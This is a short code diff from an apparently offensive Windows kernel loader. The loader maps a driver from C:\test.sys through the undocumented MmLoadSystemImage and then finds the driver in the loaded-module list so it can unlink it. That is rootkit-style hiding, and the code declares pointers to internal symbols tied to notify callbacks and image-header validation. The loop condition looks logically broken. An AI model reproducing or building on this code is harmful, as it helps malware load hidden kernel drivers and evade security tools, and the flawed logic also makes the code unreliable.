@@ -7,7 +7,7 @@ UNICODE_STRING ImagePath = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\test.sys");
 tMmLoadSystemImage MmLoadSystemImage;
 
 UINT32* PspNotifyEnableMask;
-LIST_ENTRY* PsLoadedModuleList;
+PDBGKD_GET_VERSION64 KdVersionBlock;
 void* SeValidateImageHeader,
 	*KeInitAmd64SpecificState,
 	*ExpLicenseWatchInitWorker;
@@ -24,14 +24,14 @@ NTSTATUS Loader::LoadDriver() {
 	void* ModuleObject, *ImageBaseAddress;
 	NTSTATUS Status = MmLoadSystemImage(&ImagePath, 0, 0, 0, &ModuleObject, &ImageBaseAddress);
 	if (Status == STATUS_SUCCESS) {
-		PLDR_DATA_TABLE_ENTRY LoadedDriver = nullptr, Module = (PLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->Flink;
+		PLDR_DATA_TABLE_ENTRY LoadedDriver = nullptr, Module = (PLDR_DATA_TABLE_ENTRY)KdVersionBlock->PsLoadedModuleList->Flink;
 		do {
 			if (Module->DllBase == ImageBaseAddress) {
 				LoadedDriver = Module;
 				break;
 			}
 			Module = (PLDR_DATA_TABLE_ENTRY)Module->InLoadOrderLinks.Flink;
-		} while (Module != (PLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->Flink || Module != nullptr);
+		} while (Module != (PLDR_DATA_TABLE_ENTRY)KdVersionBlock->PsLoadedModuleList->Flink || Module != nullptr);
 
 		if (LoadedDriver) {
 			// Removing driver from PsLoadedModuleList
